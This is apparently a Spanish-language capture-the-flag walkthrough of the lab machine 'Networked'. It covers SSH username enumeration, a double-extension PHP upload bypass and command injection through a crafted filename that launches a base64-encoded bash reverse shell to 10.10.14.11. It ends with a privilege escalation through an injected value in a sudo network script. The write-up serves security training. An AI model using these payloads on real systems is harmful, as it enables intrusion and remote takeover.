---
title: "Networked"
---

# Networked

`SSH < 7.7`
```bash
❯ python CVE-2018-15473.py 10.10.10.146 -u root 2>/dev/null
[+] root is a valid username
❯ python CVE-2018-15473.py 10.10.10.146 -u root2 2>/dev/null
[-] root2 is an invalid username
```


`upload.php`
```PHP
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]); #AQUÍ ESTÁ LA MIGA
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) { #Retorna 0 si son iguales
        $valid = true;
      }
    }
	#shell.php.jpg pasa la validación
	

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    #shell.php.jpg pasa la validación
    
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext; #10_10_14_11.php.gif

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

`lib.php`
```php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) { #AQUÍ ESTÁ LA MIGA
  $pieces = explode('.',$filename); # shell php jpg
  $name= array_shift($pieces);
  #Array  
#(  
#    [0] => shell  
#    [1] => php    
#    [2] => jpg  
#)
  $name = str_replace('_','.',$name); # $name="shell"
  $ext = implode('.',$pieces); # php.jpg
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) { #Si la función existe, se usará
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']); #Sacat el Mime
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}


?>
```

Subir un archivo `shell.php.png` se interpreterá como `.php` por cierta configuración del servidor:
```bash
cat /etc/httpd/conf.d/php.conf

AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

```
*/3 * * * * php /home/guly/check_attack.php
```

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path)); #Devuelve los ficheros subidos cuyo nombre cumplen la regex (que no empiecen por un punto)

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue; #Itera sobre cada uno de los ficheros subidos menos index.html
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value); # $name="shell" $ext="php.jpg"
  $check = check_ip($name,$value); #$value="shell.php.jpg"

#4tt4ck on file ".$filename.": prefix is not a valid ip 

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath"); #no es controlable
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"); # $value es el nombre del archivo, podemos controlarlo
    echo "rm -f $path$value\n";
    # $value="test;/bin/bash -i >& /dev/tcp/10.10.14.11/5555 0>&1;"
    # exec("nohup /bin/rm -f $pathtest;/bin/bash /tmp/shell.sh; > /dev/null 2>&1 &");
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

```bash
echo -n '/bin/bash -i >& /dev/tcp/10.10.14.11/5555 0>&1' | base64 -w 0 ; echo
```

```bash
touch -- ';echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExLzU1NTUgMD4mMQ== | base64 -d | bash'
```

**El script se utiliza con bash -p , por lo que está protegido contra path hijacking**
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

```bash
sudo /usr/local/sbin/changename.sh 
interface NAME:
abc /bin/bash
interface PROXY_METHOD:
abc
interface BROWSER_ONLY:
abc
interface BOOTPROTO:
abc
```
